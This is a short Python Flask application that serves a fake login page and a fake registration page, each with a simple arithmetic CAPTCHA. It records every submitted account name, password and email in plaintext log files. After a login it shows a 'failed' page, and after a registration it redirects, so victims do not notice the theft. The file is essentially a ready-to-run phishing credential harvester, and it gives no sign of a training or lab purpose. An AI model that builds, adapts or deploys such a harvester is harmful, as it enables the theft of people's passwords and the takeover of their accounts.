
from flask import Flask, request, render_template, redirect
import datetime
import random
import time

app = Flask(__name__)

captcha_answer = None

@app.route('/')
def fake_login():
    global captcha_answer
    num1 = random.randint(1, 20)
    num2 = random.randint(1, 20)
    captcha_answer = num1 + num2
    question = f"{num1} + {num2} = ?"
    return render_template("fake_login.html", captcha_question=question, message="")

@app.route('/login', methods=['POST'])
def capture_login():
    global captcha_answer
    account = request.form.get("account")
    password = request.form.get("password")
    user_captcha = request.form.get("captcha")


    if not user_captcha or int(user_captcha) != captcha_answer:
        message = "❌ CAPTCHA is wrong，please try again"
        question = f"{random.randint(1,9)} + {random.randint(1,9)} = ?"
        return render_template("fake_login.html", captcha_question=question, message=message)


    with open("captured_logins.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] account={account}, password={password}\n")


    return render_template("fake_login_failed.html", account=account)


@app.route('/register', methods=['GET', 'POST'])
def fake_register():
    if request.method == 'POST':
        new_account = request.form.get("new_account")
        new_password = request.form.get("new_password")
        new_email = request.form.get("new_email")


        with open("captured_registrations.txt", "a") as f:
            f.write(f"[{datetime.datetime.now()}] REGISTERED account={new_account}, password={new_password}, email={new_email}\n")

        # return render_template("register_success.html", account=new_account)
        return redirect("http://localhost:5000")
        # return redirect("http://localhost:5000/register?error=network")

    return render_template("fake_register.html", message="")


if __name__ == '__main__':
    app.run(port=8888, debug=True)
